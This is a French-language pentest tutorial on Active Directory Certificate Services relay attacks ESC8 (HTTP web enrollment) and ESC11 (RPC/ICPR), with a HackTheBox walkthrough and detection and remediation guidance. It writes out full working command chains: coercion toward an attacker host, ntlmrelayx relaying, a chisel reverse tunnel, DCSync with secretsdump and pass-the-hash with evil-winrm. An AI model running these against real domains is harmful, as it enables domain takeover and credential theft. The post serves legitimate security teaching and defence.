> **TL;DR** — ESC8 et ESC11 exploitent le même principe : relayer une auth NTLM vers la CA pour obtenir un certificat au nom d'un DC, puis PKINIT → TGT → DCSync → Domain Admin. La différence tient au canal : **HTTP** (web enrollment IIS) pour ESC8, **RPC/ICPR** (port 135) pour ESC11. Aucun template mal configuré n'est nécessaire — le template `DomainController` est présent par défaut. ESC8 est plus simple mais de plus en plus corrigé ; ESC11 est le fallback quand le web enrollment est fermé ou protégé par EPA.
{: .prompt-info }

| | |
|---|---|
| **Contexte** | Pentest interne, compromission AD via ADCS |
| **Prérequis** | Compte domaine (pour la coercion), accès réseau vers la CA |
| **Cible** | Certificat machine du DC → PKINIT → TGT → DCSync |
| **Outils** | certipy, ntlmrelayx (impacket), coercer / PetitPotam, evil-winrm |
| **MITRE ATT&CK** | [T1649 — Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) |

Cet article fait suite à celui sur [ADCS (ESC1 à ESC8)](/posts/adcs/) et s'appuie sur les concepts couverts dans [NTLM](/posts/ntlm/) (relay) et [Kerberos](/posts/kerberos/) (PKINIT). On ne revient pas sur les fondamentaux ADCS ni sur le fonctionnement détaillé de NTLM — ici on se concentre sur les deux canaux d'enrollment vulnérables au relay et sur ce qui les distingue.

## 1. Les canaux d'enrollment ADCS

Il existe plusieurs façons de demander un certificat à la CA. Deux nous intéressent :

1. **Web Enrollment (HTTP/HTTPS)** — Interface IIS exposée sur `/certsrv/certfnsh.asp`. Auth NTLM ou Kerberos. Canal ciblé par **ESC8**.

2. **ICPR via RPC (port 135)** — Protocole natif Windows (MS-ICPR). Le client se connecte au service RPC de la CA et soumet sa CSR. Canal ciblé par **ESC11**.

Dans les deux cas, l'authentification peut être NTLM — donc relayable.

> Les protections qui bloquent le relay diffèrent selon le canal : **EPA** (Channel Binding) protège le web enrollment HTTPS, le flag **`IF_ENFORCEENCRYPTICERTREQUEST`** protège le RPC. Si aucune n'est activée sur le canal correspondant, le relay passe.
{: .prompt-warning }

## 2. ESC8 — NTLM Relay vers Web Enrollment

ESC8 exploite le fait que le Web Enrollment accepte l'auth NTLM en HTTP. Pas de TLS, pas de channel binding — un relay classique suffit. On coerce le DC, on relaie vers `/certsrv/certfnsh.asp`, la CA délivre un certificat au nom du DC.

### 2.1 Conditions de vulnérabilité

1. **Web Enrollment activé** — Le rôle "Certificate Authority Web Enrollment" est installé sur la CA
2. **HTTP activé** (pas uniquement HTTPS) — Si seul HTTPS est activé avec channel binding, le relay échoue
3. Le port HTTP de la CA est **accessible** depuis le réseau de l'attaquant
4. Un **template** permet l'enrollment pour le type de compte relayé — `DomainController` ou `Machine`

### 2.2 Détection et exploitation

Énumération avec certipy (la commande est la même pour ESC8 et ESC11) :

```bash
certipy find -u user@domain.htb -p password -dc-ip DC_IP -vulnerable -stdout
```

```text
[!] Vulnerabilities
    ESC8 : Web Enrollment is enabled over HTTP.
```

**Exploitation :**

```bash
# 1. Lancer le relay vers le web enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# 2. Coercer le DC
coercer coerce -l ATTACKER_IP -t DC_IP -d domain.htb \
  -u user -p password --dc-ip DC_IP
```

`--adcs` dit à ntlmrelayx de soumettre une CSR quand l'auth réussit. Le certificat sort en base64 dans la console — à convertir en `.pfx` avec certipy.

| | |
|---|---|
| **Forces** | Simple, bien documenté, support natif dans ntlmrelayx (`--adcs`) |
| **Limites** | Nécessite le web enrollment installé, activé, ET accessible en HTTP. De plus en plus corrigé |

## 3. ESC11 — NTLM Relay vers ICPR (RPC)

ESC11 fait la même chose qu'ESC8, mais par un autre canal. Au lieu du web enrollment, on relaie vers le service RPC de la CA via l'interface **MS-ICPR** (ICertPassage Remote Protocol) sur le port 135.

La vulnérabilité existe quand la CA ne force pas le chiffrement des requêtes ICPR — le flag `IF_ENFORCEENCRYPTICERTREQUEST` est désactivé.

### 3.1 Pourquoi le chiffrement bloque le relay

Quand le chiffrement ICPR est activé, le client et le serveur négocient une clé de session RPC. L'attaquant qui relaie ne peut pas participer à cette négociation (il n'a pas le hash), donc la session chiffrée ne s'établit pas.

Sans chiffrement, la CSR transite en clair sur le canal RPC. L'attaquant relaie l'auth NTLM, établit la session, puis envoie sa propre CSR sur ce canal authentifié mais non chiffré.

### 3.2 Conditions de vulnérabilité

1. Le flag `IF_ENFORCEENCRYPTICERTREQUEST` est **désactivé** sur la CA
2. Le port RPC (135) de la CA est **accessible** (ou via un pivot)
3. Un **template valide** existe pour le type de compte relayé

> Contrairement à ESC8, il n'y a **PAS** besoin que le web enrollment soit installé. Le service RPC est **toujours** présent sur une CA ADCS.
{: .prompt-tip }

### 3.3 Exploitation

```bash
sudo ntlmrelayx.py -t rpc://CA_IP \
  -rpc-mode ICPR \
  -icpr-ca-name 'NOM-DE-LA-CA' \
  -smb2support \
  --template DomainController
```

Différences avec ESC8 :
- `-t rpc://` au lieu de `-t http://` — on cible le service RPC
- `-rpc-mode ICPR` — interface ICPR pour l'enrollment
- `-icpr-ca-name` — le nom exact de la CA (récupéré avec `certipy find`)
- Pas de `--adcs` — le mode RPC gère l'enrollment différemment

Coercion identique à ESC8. Le `.pfx` est écrit directement sur le disque — pas de conversion manuelle.

**Variante SMB** — Si la CA nécessite une auth SMB pour accéder au named pipe RPC :

```bash
sudo ntlmrelayx.py -t rpc://CA_IP \
  -rpc-mode ICPR -rpc-use-smb \
  -auth-smb 'domain/user:password' \
  -icpr-ca-name 'NOM-DE-LA-CA' \
  --template DomainController
```

| | |
|---|---|
| **Forces** | Pas besoin du web enrollment. Service RPC toujours présent. Moins connu qu'ESC8, moins souvent corrigé. `.pfx` généré directement |
| **Limites** | Nécessite impacket récent (support `-rpc-mode ICPR` ajouté fin 2023). Parfois pivot nécessaire pour atteindre le port 135 |

## 4. ESC8 vs ESC11 — Comparaison

| Critère | ESC8 | ESC11 |
|---|---|---|
| **Canal** | HTTP (Web Enrollment) | RPC/ICPR (port 135) |
| **Cible ntlmrelayx** | `http://CA/certsrv/certfnsh.asp` | `rpc://CA` |
| **Service requis sur la CA** | IIS + Web Enrollment (rôle optionnel) | Service RPC (toujours présent) |
| **Condition de vulnérabilité** | Web Enrollment en HTTP sans EPA | Chiffrement ICPR désactivé |
| **Flag de protection** | Channel Binding (EPA) | `IF_ENFORCEENCRYPTICERTREQUEST` |
| **Flag ntlmrelayx** | `--adcs --template X` | `-rpc-mode ICPR -icpr-ca-name X --template X` |
| **Format du certificat obtenu** | Base64 dans la console | Fichier `.pfx` directement |
| **Accès réseau requis** | Port 80/443 de la CA | Port 135 de la CA |
| **Complexité** | Faible | Moyenne (parfois pivot nécessaire) |
| **Fréquence en pentest** | Courante mais de moins en moins | En hausse, souvent oubliée par les admins |

**ESC8 d'abord** quand le web enrollment est là et accessible en HTTP — c'est la voie la plus simple. **ESC11 en fallback** quand le web enrollment est fermé, désinstallé, ou protégé par EPA. Si `certipy find` affiche les deux, tente ESC8 ; si ça échoue, passe à ESC11.

## 5. Cas pratique — ESC11 sur Ghostlink (HTB)

ESC11 exploité sur Ghostlink (HackTheBox), un environnement Windows Server 2025 avec ADCS.

### 5.1 Contexte

Après avoir compromis `nvirelli` (utilisateur du domaine), on a un shell Linux sur `gpz-op26-toolkits` avec accès au réseau interne où se trouve la CA (`gpz-op26-secure`, `172.16.20.10`). Notre Kali n'a pas de route directe vers cette IP.

### 5.2 Identification de la vulnérabilité

```bash
proxychains -q certipy find -u nvirelli@ghostlink.htb -p [password] \
  -dc-ip DC_IP -vulnerable -stdout
```

```text
CA Name                           : ghostlink-GPZ-OP26-SECURE-CA
DNS Name                          : gpz-op26-secure.ghostlink.htb
Enforce Encryption for Requests   : Disabled
[!] Vulnerabilities
    ESC8  : Web Enrollment is enabled over HTTP.
    ESC11 : Encryption is not enforced for ICPR (RPC) requests.
```

Les deux ESC sont présents, mais le port HTTP de la CA refuse les connexions — ESC11 est le seul chemin.

### 5.3 Pivot avec Chisel

```bash
# Kali (serveur)
chisel server --reverse -p 9000

# Shell nvirelli (client)
./chisel client KALI_IP:9000 R:1081:socks
```

Tout outil lancé avec proxychains (configuré sur `socks5 127.0.0.1 1081`) passe par le tunnel et atteint `172.16.20.x`.

### 5.4 Relay et coercion

```bash
# Relay via le tunnel
sudo proxychains -q ntlmrelayx.py -t rpc://172.16.20.10 \
  -rpc-mode ICPR \
  -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' \
  -smb2support --template DomainController

# Coercion du DC
coercer coerce -l KALI_IP -t dc01.ghostlink.htb \
  -d ghostlink.htb -u nvirelli -p [password] \
  --dc-ip dc01.ghostlink.htb --always-continue
```

```text
[*] Authenticating GHOSTLINK/DC01$ against rpc://172.16.20.10 SUCCEED [1]
[*] -> Generating CSR...
[*] -> CSR generated!
[*] -> Getting certificate...
[*] -> Successfully requested certificate
[*] -> Writing PKCS#12 certificate to ./DC01.pfx
[*] -> Certificate successfully written to file
```

### 5.5 Du certificat au Domain Admin

```bash
# PKINIT → hash NT du DC
certipy auth -pfx DC01.pfx -dc-ip DC_IP -domain ghostlink.htb

# DCSync → hash Administrator
secretsdump.py ghostlink.htb/dc01$@dc01.ghostlink.htb \
  -dc-ip DC_IP -hashes :HASH_DC01 -just-dc-user administrator

# Pass-the-hash → shell admin
evil-winrm -i dc01.ghostlink.htb -u administrator -H HASH_ADMIN
```

De l'identification d'ESC11 à Domain Admin en 5 commandes.

## 6. Détection et remédiation

### 6.1 Détecter l'attaque

**Event logs à surveiller :**

- **Event ID 4886** (Certificate Services received a certificate request) et **4887** (approved/issued) sur la CA — une demande de certificat `DomainController` depuis une IP qui n'est pas le DC est suspecte
- **Event ID 4768** (TGT request) avec un certificat comme méthode d'authentification (pre-auth type 16/17) depuis une IP inhabituelle
- **Event ID 4662** (Directory Service access) avec les GUIDs de réplication — signe de DCSync

**Indicateurs réseau :**

- Connexion RPC (port 135) vers la CA depuis une machine qui n'est pas un client habituel d'enrollment
- Connexion HTTP vers `/certsrv/certfnsh.asp` depuis une IP non attendue
- NTLM auth relayée : la source IP de l'auth NTLM ne correspond pas à la machine qui initie la connexion vers la CA

### 6.2 Remédier

**Contre ESC8 :**

1. **Désinstaller le rôle Web Enrollment** si non nécessaire (c'est rarement indispensable)
2. Si nécessaire, forcer **HTTPS avec Extended Protection for Authentication** (EPA/Channel Binding)
3. Restreindre l'accès au web enrollment par **firewall** (seuls les clients légitimes)

**Contre ESC11 :**

1. Activer le flag `IF_ENFORCEENCRYPTICERTREQUEST` sur la CA :

```powershell
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc && net start certsvc
```

2. Vérifier que le flag est actif : `certutil -getreg CA\InterfaceFlags`

**Contre les deux :**

1. Restreindre les **templates sensibles** (`DomainController`, `Machine`) aux seuls comptes machine légitimes
2. Activer le **SMB signing** sur tout le domaine pour bloquer la coercion via SMB
3. Désactiver **NTLM** où possible (Kerberos only) pour supprimer le vecteur de relay à la source
4. Surveiller les demandes de certificat anormales avec un **SIEM**

## Conclusion

En pentest, la démarche reste simple : `certipy find -vulnerable`, puis choisir le bon canal selon ce qui est accessible. ESC8 si le web enrollment est là, ESC11 quand il ne l'est pas — ou quand EPA le protège.

Ce qui rend ces deux techniques redoutables, c'est qu'elles ne dépendent d'aucun template mal configuré. ESC1 à ESC4 nécessitent un template avec des permissions trop larges ou un SAN autorisé. ESC8 et ESC11 exploitent la configuration du **canal d'enrollment** lui-même. Et le template `DomainController` est présent par défaut sur toute CA d'entreprise.

Sur le terrain, ESC11 est de plus en plus le chemin qui reste quand ESC8 a été corrigé — et les admins oublient souvent le flag `IF_ENFORCEENCRYPTICERTREQUEST`. À vérifier systématiquement.
